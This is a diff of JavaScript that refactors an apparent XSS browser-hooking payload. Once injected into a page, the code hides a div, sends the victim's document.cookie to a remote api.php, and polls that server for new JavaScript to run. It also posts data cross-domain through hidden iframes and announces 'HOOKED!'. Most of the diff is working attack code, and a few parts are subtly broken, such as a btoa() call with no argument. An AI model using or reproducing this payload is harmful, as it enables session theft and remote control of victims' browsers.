@@ -1,21 +1,29 @@
+function xssmin(){}
+xssmin();
 
-console.log("START");
 // global variables
-var xsshide = "display:none;width:0;height:0;";
-var gdebug = "";
+var xss = {};
+xss.hide = "display:none;width:0;height:0;";
+xss.debug = "";
+xss.reg = [];
+
+xss.decrpt = function(text) {
+	return btoa();
+};
 
 // global debug function
-function xssdbg(message) { 
-	gdebug += message + ", ";
-}
+xss.dbg = function (message) { 
+	xss.debug += message + ", ";
+};
 
 // global function to pass module parameters to modules
-function xssopt(name) {
-	return(xssgbl[xssmodpre+name]);
-}
+xss.opt = function (name) {
+	return(xss.reg[name]);
+};
 
 // get cookie helper
-function xsscookie(name) {
+xss.cookie = {};
+xss.cookie.get = function (name) {
 	name += "=";
     var ca = document.cookie.split(';');
     for(var i=0; i<ca.length; i++) {
@@ -23,69 +31,74 @@ function xsscookie(name) {
         if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
     }
     return "";
-}
+};
 
-// set cookie helper
-function xss (cname, cvalue, exdays) {
+// set cookie helper defaults to the current domain
+xss.cookie.set = function (cname, cvalue, exdays) {
 	var d = new Date();
 	d.setTime(d.getTime() + (exdays*24*60*60*1000));
 	var expires = "expires="+d.toGMTString();
 	document.cookie = cname + "=" + cvalue + "; " + expires;
-}
+};
 
-// get element by id
-function xssgbi(x) {
+// alias for document.getElementById(x)
+xss.gbi = function (x) {
 	return document.getElementById(x);
-}
-// create element
-function xssce(x) {
+};
+// alias for document.createElement(x)
+xss.ce = function (x) {
 	return document.createElement(x);
-}
-// set attribute
-function xsssa(x,k,v) {
+};
+// alias for x.setAttribute(k.v);
+xss.sa = function (x,k,v) {
 	return x.setAttribute(k,v);
-}
-// remove element
-function xssrm(id) {
-	var e = xssgbi(id);
-	e.parentNode.removeChild(e);
+};
+// remove an element by id
+xss.rm = function (id) {
+	var e = xss.gbi(id);
+	if (e) { e.parentNode.removeChild(e); }
 }
 
 // an area for us to add content
-function createSploit() {
-	//document.write("<div id='sploit' style='display:none'>text</div>");
-	var d = xssce("div");
-	xsssa(d, "id", "sploit");
-	xsssa(d, "style", "display:none");
-	document.body.appendChild(d);
-}
+xss.getdiv = function () {
+	var d = xss.gbi("sploit");
+	if (!d) { 
+		var d = xss.ce("div");
+		xss.sa(d, "id", "sploit");
+		xss.sa(d, "style", xss.hide);
+		document.body.appendChild(d);
+		d = xss.gbi("sploit");
+	}
+	return d;
+};
+
+// remove the workspace area we add content to
+xss.cls = function () {
+	xss.rm("sploit");
+};
 
 // register this browser with the network
-function reg() {
-	createSploit();
-	cs("http://"+sploit+"/api.php?reg="+sploitid+"&c="+encodeURIComponent(document.cookie));
-}
+xss.reg = function () {
+	xss.cs(xss.api + "?reg="+sploitid+"&c="+encodeURIComponent(document.cookie));
+};
 
-// send the heartbeat and get new JavaScript
-function hb() { 
+// send the heartbeat, and debug message and get new JavaScript to execute (if some is waiting)
+xss.hb = function() { 
+	// only send back heart beat for the top window
 	if (window.top==window.self) {
-		cs('http://'+sploit+'/api.php?id='+sploitid+"&d="+gdebug);
-		gdebug = "";
+		xss.cs(xss.api+'?id='+sploitid+"&d="+xss.debug);
+		xss.debug = "";
 	}
-}
+};
 
 // add a script to the page
-function cs(s) { 
-	var script = document.createElement("script");
+xss.cs = function (s) { 
+	var script = xss.ce("script");
 	script.type="text/javascript";
 	script.src=s;
-	var d = xssgbi("sploit");
-	if (!d) { 
-		createSploit();
-	}
-	d = xssgbi("sploit");
+	var d = xss.getdiv();
 	d.appendChild(script);
-}
+};
 
 /**
  * create an image. used for genertic GET requests
@@ -95,24 +108,22 @@ function cs(s) {
  * err: onerror function (or false)
  * load: onload function (or false)
  */
-function ci(url, st, id, err, load) { 
-	var xssi = xssce('img');
-	xssi.style=st;
-	if (load) { 
-		xsssa(xssi, "onload", load);
-		console.log("add load event");
-	}
+xss.ci = function (url, st, id, err, load) { 
+	var i = xss.ce('img');
+	i.style=st;
 	if (err) {
-		xsssa(xssi, "onerror", err);
-		console.log("add error event");
+		xss.sa(i, "onerror", err);
 	}
-	xssi.onload = function() { 
-		console.log("image loaded!");
-		console.log(xssi);
-		document.body.appendChild(xssi);
+	if (load) { 
+		xss.sa(i, "onload", load);
 	}
-	xssi.src=url;
-}
+	else {
+		i.onload = function() { 
+			document.body.appendChild(i);
+		}
+	}
+	i.src=url;
+};
 
 /**
  * post data to another domain without Ajax (you never know....)
@@ -121,25 +132,26 @@ function ci(url, st, id, err, load) {
  * data: (dictionary) key value array of data to post
  * a: the api action (usually 'log')
  */
-function xsscop(url, data) {
-	// create elements
-	var ifr = xssce('iframe');
-	var frm = xssce('form');
-	// set attributes
-	xsssa(ifr, "name", "cspost");
-	xsssa(ifr, "style", xsshide);
-	xsssa(ifr, "id", "xsscop");
+xss.cop = function (url, data) {
 
-	xsssa(frm, "action", url);
-	xsssa(frm, "method", "post");
-	xsssa(frm, "target", "cspost");
+	// create elements
+	var ifr = xss.ce('iframe');
+	var frm = xss.ce('form');
+	// set attributes
+	xss.sa(ifr, "name", "cspost");
+	xss.sa(ifr, "style", xss.hide);
+	xss.sa(ifr, "id", "xsscop");
+
+	xss.sa(frm, "action", url);
+	xss.sa(frm, "method", "post");
+	xss.sa(frm, "target", "cspost");
 
 	// create an input for each post variable
 	for (d in data) {
-		var e = xssce("input");
-		xsssa(e, "type", "hidden");
-		xsssa(e, "name", d);
-		xsssa(e, "value", data[d]);
+		var e = xss.ce("input");
+		xss.sa(e, "type", "hidden");
+		xss.sa(e, "name", d);
+		xss.sa(e, "value", data[d]);
 		frm.appendChild(e);
 	}
 
@@ -150,20 +162,25 @@ function xsscop(url, data) {
 	document.body.appendChild(ifr);
 	// submit the form
 	frm.submit();
-	// remove the frame
-	xssrm("xsscop");
-}
+	// remove the frame (we can't read the response anyway due to cross origin policies)
+	xss.rm("xsscop");
+};
 
 // append content to the sploit div
-function xssappend(t) {
-	xssgbi('sploit').innerHTML+=t;
-}
+xss.append = function (t) {
+	xss.getdiv().innerHTML+=t;
+};
 
 // remove content from the sploit div
-function xsscls(t) {
-	xssgbi('sploit').innerHTML="";
+xss.cls = function () {
+	xss.getdiv().innerHTML+="";
+};
+
+// register the browser with the network (IF we are the top most window)
+if (window.top==window.self) {
+	console.log("HOOKED!");
+	window.setTimeout(xss.reg, 50);
+	console.log(xss);
 }
 
-// register the browser with the network
-reg();
 
